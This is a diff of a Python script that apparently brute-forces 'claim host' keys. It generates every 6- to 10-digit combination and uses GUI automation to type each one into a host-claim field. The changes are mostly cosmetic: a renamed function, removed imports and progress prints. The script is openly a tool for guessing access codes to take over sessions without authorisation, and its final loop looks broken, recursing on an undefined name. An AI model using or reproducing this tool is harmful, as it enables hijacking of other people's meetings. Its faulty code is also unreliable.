@@ -6,8 +6,7 @@ import pyperclip
 import logging
 import time
 import timeit
-import random
-import schedule
+import csv
 import sys
 from pynput.mouse import Button, Controller
 
@@ -27,9 +26,9 @@ The program will search your screen for the claim host button and try to input a
 
 print('\n')
 
-digit_query = input('Enter a number between 6 and 10 (hit control-c to terminate the program if it stalls): ')
+digit_query = input('Enter a number between 6 and 10: ')
 
-def generate_combinations(digits):
+def generate_perms(digits):
     print('Creating key list...')
     combos = list(itertools.product([0,1,2,3,4,5,6,7,8,9], repeat=digits))
     for i in combos:
@@ -38,12 +37,12 @@ def generate_combinations(digits):
 
 if 6 <= int(digit_query) <= 7:
     print('This should take less than a minute.')
-    generate_combinations(int(digit_query))
+    generate_perms(int(digit_query))
     print('List complete!')
 elif 8 <= int(digit_query) <= 10:
     warning = input('You are about to generate between 10 Million and 1 Billion numbers on your machine, do you wish to continue? [Y/N] ')
     if warning == 'Y' or warning == 'y':
-        generate_combinations(int(digit_query))
+        generate_perms(int(digit_query))
         print('List complete!')
     elif warning == 'N' or warning == 'n':
         print('Bye :)')
@@ -101,11 +100,11 @@ def turn_key(i):
 
 def copy(keycode):
     pyperclip.copy(keycode)
-    print("Trying {}".format(keycode))
 
 def paste(keycode):
     pyautogui.write(keycode)
     pyautogui.press('enter')
+
 
 def test_code(code):
     key = turn_key(code)
@@ -115,7 +114,6 @@ def test_code(code):
     pyautogui.move(-100, 0)
     mouse.click(Button.left, 2)
     pyautogui.press('backspace')
-    end = time.time()
     for i in master_key:
         test_code(nex)
 
